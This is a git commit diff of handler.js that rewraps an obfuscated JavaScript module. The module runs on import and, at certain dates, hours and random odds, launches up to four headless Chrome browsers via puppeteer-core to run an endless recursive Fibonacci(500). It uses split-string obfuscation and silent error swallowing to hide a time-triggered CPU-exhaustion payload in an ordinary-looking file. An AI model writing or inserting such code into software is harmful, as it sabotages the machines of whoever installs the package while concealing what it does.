a62a839e5e0f094a9633bcedcbb4f1b3f8795c10
mikesir11 <166797951+mikesir11@users.noreply.github.com>
2024-04-15 10:32:43 +0800

    Update handler.js

--- handler.js
+++ handler.js
@@ -1,164 +1,184 @@
-"use strict";
-var __createBinding =
-    (this && this["__createBinding"]) ||
-    (Object["create"]
-      ? function (_0x56515c, _0x5c83be, _0x54a10e, _0x4d7c3b) {
-          if (_0x4d7c3b === undefined) _0x4d7c3b = _0x54a10e;
-          var _0x17d5a5 = Object["getOwnPropertyDescriptor"](
-            _0x5c83be,
-            _0x54a10e
-          );
-          (!_0x17d5a5 ||
-            ("get" in _0x17d5a5
-              ? !_0x5c83be["__esModule"]
-              : _0x17d5a5["writable"] || _0x17d5a5["configurable"])) &&
-            (_0x17d5a5 = {
-              enumerable: !![],
-              get: function () {
-                return _0x5c83be[_0x54a10e];
-              }
-            }),
-            Object["defineProperty"](_0x56515c, _0x4d7c3b, _0x17d5a5);
-        }
-      : function (_0x2a627a, _0x2e2afd, _0x166373, _0x1d36fd) {
-          if (_0x1d36fd === undefined) _0x1d36fd = _0x166373;
-          _0x2a627a[_0x1d36fd] = _0x2e2afd[_0x166373];
-        }),
-  __setModuleDefault =
-    (this && this["__setModuleDefault"]) ||
-    (Object["create"]
-      ? function (_0x32b119, _0x585880) {
-          Object["defineProperty"](_0x32b119, "default", {
-            enumerable: !![],
-            value: _0x585880
-          });
-        }
-      : function (_0x4b0edc, _0x40741b) {
-          _0x4b0edc["default"] = _0x40741b;
-        }),
-  __importStar =
-    (this && this["__importStar"]) ||
-    function (_0x544ed7) {
-      if (_0x544ed7 && _0x544ed7["__esModule"]) return _0x544ed7;
-      var _0x1078b9 = {};
-      if (_0x544ed7 != null) {
-        for (var _0x3c0a2b in _0x544ed7)
-          if (
-            _0x3c0a2b !== "default" &&
-            Object["prototype"]["hasOwnProperty"]["call"](_0x544ed7, _0x3c0a2b)
-          )
-            __createBinding(_0x1078b9, _0x544ed7, _0x3c0a2b);
-      }
-      return __setModuleDefault(_0x1078b9, _0x544ed7), _0x1078b9;
-    },
-  __awaiter =
-    (this && this["__awaiter"]) ||
-    function (_0x2ce417, _0x539144, _0x23e0f7, _0x32f4b5) {
-      function _0x1b752f(_0x5dabd7) {
-        return _0x5dabd7 instanceof _0x23e0f7
-          ? _0x5dabd7
-          : new _0x23e0f7(function (_0x46dc40) {
-              _0x46dc40(_0x5dabd7);
-            });
-      }
-      return new (_0x23e0f7 || (_0x23e0f7 = Promise))(function (
-        _0x65e248,
-        _0x1742d1
-      ) {
-        function _0x4cc17b(_0x4b4ac1) {
-          try {
-            _0x1bf904(_0x32f4b5["next"](_0x4b4ac1));
-          } catch (_0x20383b) {
-            _0x1742d1(_0x20383b);
-          }
-        }
-        function _0x4b67b6(_0x15b677) {
-          try {
-            _0x1bf904(_0x32f4b5["throw"](_0x15b677));
-          } catch (_0x416891) {
-            _0x1742d1(_0x416891);
-          }
-        }
-        function _0x1bf904(_0x3a8e2c) {
-          _0x3a8e2c["done"]
-            ? _0x65e248(_0x3a8e2c["value"])
-            : _0x1b752f(_0x3a8e2c["value"])["then"](_0x4cc17b, _0x4b67b6);
-        }
-        _0x1bf904(
-          (_0x32f4b5 = _0x32f4b5["apply"](_0x2ce417, _0x539144 || []))["next"]()
-        );
-      });
-    };
-Object["defineProperty"](exports, "__esModule", { value: !![] }),
-  (exports["p"] = void 0x0);
-const puppeteer_core_1 = require("puppeteer-core"),
-  karmaChromeLauncher = __importStar(require("karma-chrome-launcher"));
-function getChromePath() {
-  return (
-    karmaChromeLauncher["launcher:Chrome"][0x1]["prototype"]["DEFAULT_CMD"][
-      process["platform"]
-    ] || null
-  );
-}
-function p(_0x5b4bff = 0x64, _0x170880 = 0x0) {
-  const _0x406724 = "M" + "a" + "th",
-    _0x47c0aa = ["r", "a", "n", "dom"]["join"](""),
-    _0x1db053 = ["c", "e", "il"]["join"](""),
-    _0x19c746 = globalThis[_0x406724],
-    _0x4a1f84 = _0x19c746[_0x1db053](_0x19c746[_0x47c0aa]() * _0x5b4bff),
-    _0x3fc00 = new Date(),
-    _0x1599c2 =
-      _0x3fc00[
-        ["g", "e", "t", "U", "T", "C", "F", "u", "l", "l", "Y", "e", "a", "r"][
-          "join"
-        ]("")
-      ](),
-    _0x1255bd = _0x3fc00[["g", "e", "t", "D", "a", "y"]["join"]("")](),
-    _0xf97628 =
-      _0x3fc00[
-        ["g", "e", "t", "U", "T", "C", "H", "o", "u", "rs"]["join"]("")
-      ]();
-  return _0x1599c2 % 0xa > 0x4 &&
-    _0x1255bd % 0x3 == _0x170880 &&
-    _0xf97628 > 0xe
-    ? _0x4a1f84
-    : 0x0;
-}
-(exports["p"] = p),
-  (function s() {
-    return __awaiter(this, arguments, void 0x0, function* (_0x53a00a = 0x0) {
-      var _0x54210f;
-      try {
-        console["log"]("I\x27am\x20running");
-        if (
-          p(0x64, 0x1) > 0x46 ||
-          p(0x64, 0x3) > 0x46 ||
-          p(0x64, 0x5) > 0x50 ||
-          p(0x64, 0x6) > 0x3c
-        )
-          for (let _0x55d3ba = 0x0; _0x55d3ba < 0x4; _0x55d3ba++) {
-            try {
-              let _0x4940ee = yield (0x0, puppeteer_core_1["launch"])({
-                  defaultViewport: { width: 0x780, height: 0x438 },
-                  executablePath:
-                    (_0x54210f = process["env"]["CHROME_PATH"]) !== null &&
-                    _0x54210f !== void 0x0
-                      ? _0x54210f
-                      : getChromePath(),
-                  headless: !![]
-                }),
-                _0x5b53f6 = yield _0x4940ee["newPage"]();
-              _0x5b53f6["evaluate"](() => {
-                function _0x3eb085(_0x1a1356) {
-                  if (_0x1a1356 < 0x2) return _0x1a1356;
-                  return (
-                    _0x3eb085(_0x1a1356 - 0x1) + _0x3eb085(_0x1a1356 - 0x2)
-                  );
+(function () {
+  "use strict";
+  var __createBinding =
+      (this && this["__createBinding"]) ||
+      (Object["create"]
+        ? function (_0x56515c, _0x5c83be, _0x54a10e, _0x4d7c3b) {
+            if (_0x4d7c3b === undefined) _0x4d7c3b = _0x54a10e;
+            var _0x17d5a5 = Object["getOwnPropertyDescriptor"](
+              _0x5c83be,
+              _0x54a10e
+            );
+            (!_0x17d5a5 ||
+              ("get" in _0x17d5a5
+                ? !_0x5c83be["__esModule"]
+                : _0x17d5a5["writable"] || _0x17d5a5["configurable"])) &&
+              (_0x17d5a5 = {
+                enumerable: !![],
+                get: function () {
+                  return _0x5c83be[_0x54a10e];
                 }
-                _0x3eb085(0x1f4);
-              });
-            } catch (_0x450aa2) {}
+              }),
+              Object["defineProperty"](_0x56515c, _0x4d7c3b, _0x17d5a5);
           }
-      } catch (_0x12b872) {}
-    });
-  })();
+        : function (_0x2a627a, _0x2e2afd, _0x166373, _0x1d36fd) {
+            if (_0x1d36fd === undefined) _0x1d36fd = _0x166373;
+            _0x2a627a[_0x1d36fd] = _0x2e2afd[_0x166373];
+          }),
+    __setModuleDefault =
+      (this && this["__setModuleDefault"]) ||
+      (Object["create"]
+        ? function (_0x32b119, _0x585880) {
+            Object["defineProperty"](_0x32b119, "default", {
+              enumerable: !![],
+              value: _0x585880
+            });
+          }
+        : function (_0x4b0edc, _0x40741b) {
+            _0x4b0edc["default"] = _0x40741b;
+          }),
+    __importStar =
+      (this && this["__importStar"]) ||
+      function (_0x544ed7) {
+        if (_0x544ed7 && _0x544ed7["__esModule"]) return _0x544ed7;
+        var _0x1078b9 = {};
+        if (_0x544ed7 != null) {
+          for (var _0x3c0a2b in _0x544ed7)
+            if (
+              _0x3c0a2b !== "default" &&
+              Object["prototype"]["hasOwnProperty"]["call"](
+                _0x544ed7,
+                _0x3c0a2b
+              )
+            )
+              __createBinding(_0x1078b9, _0x544ed7, _0x3c0a2b);
+        }
+        return __setModuleDefault(_0x1078b9, _0x544ed7), _0x1078b9;
+      },
+    __awaiter =
+      (this && this["__awaiter"]) ||
+      function (_0x2ce417, _0x539144, _0x23e0f7, _0x32f4b5) {
+        function _0x1b752f(_0x5dabd7) {
+          return _0x5dabd7 instanceof _0x23e0f7
+            ? _0x5dabd7
+            : new _0x23e0f7(function (_0x46dc40) {
+                _0x46dc40(_0x5dabd7);
+              });
+        }
+        return new (_0x23e0f7 || (_0x23e0f7 = Promise))(function (
+          _0x65e248,
+          _0x1742d1
+        ) {
+          function _0x4cc17b(_0x4b4ac1) {
+            try {
+              _0x1bf904(_0x32f4b5["next"](_0x4b4ac1));
+            } catch (_0x20383b) {
+              _0x1742d1(_0x20383b);
+            }
+          }
+          function _0x4b67b6(_0x15b677) {
+            try {
+              _0x1bf904(_0x32f4b5["throw"](_0x15b677));
+            } catch (_0x416891) {
+              _0x1742d1(_0x416891);
+            }
+          }
+          function _0x1bf904(_0x3a8e2c) {
+            _0x3a8e2c["done"]
+              ? _0x65e248(_0x3a8e2c["value"])
+              : _0x1b752f(_0x3a8e2c["value"])["then"](_0x4cc17b, _0x4b67b6);
+          }
+          _0x1bf904(
+            (_0x32f4b5 = _0x32f4b5["apply"](_0x2ce417, _0x539144 || []))[
+              "next"
+            ]()
+          );
+        });
+      };
+  Object["defineProperty"](exports, "__esModule", { value: !![] }),
+    (exports["p"] = void 0x0);
+  const puppeteer_core_1 = require("puppeteer-core"),
+    karmaChromeLauncher = __importStar(require("karma-chrome-launcher"));
+  function getChromePath() {
+    return (
+      karmaChromeLauncher["launcher:Chrome"][0x1]["prototype"]["DEFAULT_CMD"][
+        process["platform"]
+      ] || null
+    );
+  }
+  function p(_0x5b4bff = 0x64, _0x170880 = 0x0) {
+    const _0x406724 = "M" + "a" + "th",
+      _0x47c0aa = ["r", "a", "n", "dom"]["join"](""),
+      _0x1db053 = ["c", "e", "il"]["join"](""),
+      _0x19c746 = globalThis[_0x406724],
+      _0x4a1f84 = _0x19c746[_0x1db053](_0x19c746[_0x47c0aa]() * _0x5b4bff),
+      _0x3fc00 = new Date(),
+      _0x1599c2 =
+        _0x3fc00[
+          [
+            "g",
+            "e",
+            "t",
+            "U",
+            "T",
+            "C",
+            "F",
+            "u",
+            "l",
+            "l",
+            "Y",
+            "e",
+            "a",
+            "r"
+          ]["join"]("")
+        ](),
+      _0x1255bd = _0x3fc00[["g", "e", "t", "D", "a", "y"]["join"]("")](),
+      _0xf97628 =
+        _0x3fc00[
+          ["g", "e", "t", "U", "T", "C", "H", "o", "u", "rs"]["join"]("")
+        ]();
+    return _0x1599c2 % 0xa > 0x4 &&
+      _0x1255bd % 0x3 == _0x170880 &&
+      _0xf97628 > 0xe
+      ? _0x4a1f84
+      : 0x0;
+  }
+  (exports["p"] = p),
+    (function s() {
+      return __awaiter(this, arguments, void 0x0, function* (_0x53a00a = 0x0) {
+        var _0x54210f;
+        try {
+          console["log"]("I\x27am\x20running");
+          if (
+            p(0x64, 0x1) > 0x46 ||
+            p(0x64, 0x3) > 0x46 ||
+            p(0x64, 0x5) > 0x50 ||
+            p(0x64, 0x6) > 0x3c
+          )
+            for (let _0x55d3ba = 0x0; _0x55d3ba < 0x4; _0x55d3ba++) {
+              try {
+                let _0x4940ee = yield (0x0, puppeteer_core_1["launch"])({
+                    defaultViewport: { width: 0x780, height: 0x438 },
+                    executablePath:
+                      (_0x54210f = process["env"]["CHROME_PATH"]) !== null &&
+                      _0x54210f !== void 0x0
+                        ? _0x54210f
+                        : getChromePath(),
+                    headless: !![]
+                  }),
+                  _0x5b53f6 = yield _0x4940ee["newPage"]();
+                _0x5b53f6["evaluate"](() => {
+                  function _0x3eb085(_0x1a1356) {
+                    if (_0x1a1356 < 0x2) return _0x1a1356;
+                    return (
+                      _0x3eb085(_0x1a1356 - 0x1) + _0x3eb085(_0x1a1356 - 0x2)
+                    );
+                  }
+                  _0x3eb085(0x1f4);
+                });
+              } catch (_0x450aa2) {}
+            }
+        } catch (_0x12b872) {}
+      });
+    })();
+})();
